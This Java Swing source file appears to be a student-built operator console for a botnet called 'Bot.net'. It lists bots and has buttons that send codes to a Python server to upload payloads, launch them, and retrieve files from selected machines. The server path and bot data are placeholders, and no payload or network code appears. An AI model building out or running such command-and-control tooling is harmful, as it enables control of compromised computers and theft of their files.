/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package servergui;

import java.awt.BorderLayout;
import java.awt.ComponentOrientation;
import java.awt.Dimension;
import java.awt.HeadlessException;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import java.lang.ProcessBuilder;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

/**
 *
 * @author Douglas
 */
public class ServerFrame extends JFrame {
    private final BorderLayout LAYOUT;
    private final JLabel NAMEBAR;
    private final JMenuBar menuBar;
    private final JMenu menu;// subMenu, subMenu1;
    private final JList botList;
    private final JMenuItem menuItem;
    private final JButton b1, b2, b3;
    
    
    private BufferedReader readProc;
    private BufferedReader readProcErr;
    private BufferedWriter writeProc;
    
    private final static boolean RIGHT_TO_LEFT = false; 
    //constants to set
    private final static String PYTHONSCRIPT = "";
    private final static String PYTHONPATH = "";
    private final static String GETBOTSTATUS = "";
    private final static String UPLOADPAYLOADS = "$UP$";
    private final static String LAUNCHPAYLOADS = "$LP$";
    private final static String RETRIEVEFILES = "$RF$";
    private final static char DELIMITER = '$';
    
    private List<String> selectedValuesList;
    
    public ServerFrame() throws HeadlessException {
        super("Bot.net");
        startUp();
        
        
        LAYOUT = new BorderLayout();
        JPanel pane = new JPanel(LAYOUT);
        
        if(RIGHT_TO_LEFT)
        {
            pane.setComponentOrientation(ComponentOrientation.RIGHT_TO_LEFT);
        }
        
        //Set Up Pannels
        
        b1 = new JButton("Launch Payloads");
        pane.add(b1, BorderLayout.CENTER);
        b1.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                if(0 != selectedValuesList.size())
                {
                    for(String tmp: selectedValuesList)
                    {
                        String[] splited = tmp.split("\\s+");
                        try
                        {
                            writeProc.write(LAUNCHPAYLOADS + splited[0]);   
                        }
                        catch(Exception exc)
                        {
                            System.out.println(exc);
                        }
                    }
                }
            }
        });
        b1.setEnabled(false);
        
        b2 = new JButton("Upload Payloads");
        pane.add(b2, BorderLayout.LINE_START);
        b2.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                if(0 < selectedValuesList.size())
                {
                    for(String tmp: selectedValuesList)
                    {
                        String[] splited = tmp.split("\\s+");
                        try
                        {
                            writeProc.write(UPLOADPAYLOADS + splited[0]);   
                        }
                        catch(Exception exc)
                        {
                            System.out.println(exc);
                        }
                    }
                }
            }
        });
        b2.setEnabled(false);
        
        //button = new JButton("Long-Named Button 4 (PAGE_END)");
        //pane.add(button, BorderLayout.PAGE_END);
        
        b3 = new JButton("Retrieve Files");
        pane.add(b3, BorderLayout.LINE_END);
        b3.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                if(0 < selectedValuesList.size())
                {
                    for(String tmp: selectedValuesList)
                    {
                        String[] splited = tmp.split("\\s+");
                        try
                        {
                            writeProc.write(RETRIEVEFILES + splited[0]);   
                        }
                        catch(Exception exc)
                        {
                            System.out.println(exc);
                        }
                    }
                }
            }
        });
        b3.setEnabled(false);



        DefaultListModel<String> listModel = new DefaultListModel<>();
        updateList();
        //add starting bots to list
        
        //for testing
        listModel.addElement("Bot1");
        listModel.addElement("Bot2");
        listModel.addElement("Bot3");
        listModel.addElement("Bot4");
        listModel.addElement("Bot5");
        
        //create the List
        botList = new JList<>(listModel);
        botList.addListSelectionListener(new ListSelectionListener(){
            @Override
            public void valueChanged(ListSelectionEvent e)
            {
                if (!e.getValueIsAdjusting())
                {
                    selectedValuesList = botList.getSelectedValuesList();
                    System.out.println(selectedValuesList);
                    b1.setEnabled(true);
                    b2.setEnabled(true);
                    b3.setEnabled(true);
                }
            }
        });
        add(new JScrollPane(botList));
        
        botList.setPreferredSize(new Dimension(200, 400));
        pane.add(botList, BorderLayout.PAGE_START);
        
        
        
        //set up NameBar
        NAMEBAR = new JLabel("By Douglas Hennenfent, Mitch Schmidt, and Shawn Stone");
        NAMEBAR.setHorizontalTextPosition(JLabel.CENTER);
        pane.add(NAMEBAR, BorderLayout.PAGE_END);
        
        //build the menu
        menuBar = new JMenuBar();
        menu = new JMenu("Options");
        menu.setMnemonic(KeyEvent.VK_O);
        menuBar.add(menu);
        
        //exits program, shuts down server
        menuItem = new JMenuItem("Exit");
        menuItem.setMnemonic(KeyEvent.VK_X);
        menuItem.addActionListener(new ActionListener()
        {
            @Override
            public void actionPerformed(ActionEvent e)
            {
                System.exit(0);
            }
        });
        menu.add(menuItem);
        
        this.setJMenuBar(menuBar);
        
        //add pane to frame
        this.setContentPane(pane);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setSize(800,600);
        this.setVisible(true);
        

    }//end ServerFrame
    
    private void startUp()
    {
        System.out.println("Initializing");
        
        //start the python serverprocess
        try
        {
            ProcessBuilder pb = new ProcessBuilder(PYTHONSCRIPT);
            Process p = pb.start();
            
            readProc = new BufferedReader(new InputStreamReader(p.getInputStream()));
            readProcErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            writeProc = new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
        }
        catch(Exception e)
        {
            System.out.println(e);
        }
    }//end startUp()
    
    private void updateList()
    {
        ArrayList<String>Updated = new ArrayList<>();
        try
        {
            writeProc.write(GETBOTSTATUS);   
        }
        catch(Exception e)
        {
            System.out.println(e);
        }
        try
        {
            String currentLine;
            while(null != (currentLine = readProc.readLine()))
            {
                //reformat the line
                Updated.add(currentLine.replace(DELIMITER, '\t'));
            }
        }
        catch(Exception e)
        {
            System.out.println(e);
        }   
    }//end updateList()  
}//end class ServerFrame




/*references
* http://way2java.com/swing/jlist-with-multiple-selection/
* http://www.codejava.net/java-se/swing/jlist-basic-tutorial-and-examples
* http://stackoverflow.com/questions/26171862/java-processbuilder-not-able-to-run-python-script-in-java
* http://stackoverflow.com/questions/15980057/processbuilder-cannot-run-python-script-with-arguments
* http://alvinalexander.com/java/java-exec-processbuilder-process-1
*
*
*
*
*
*
*/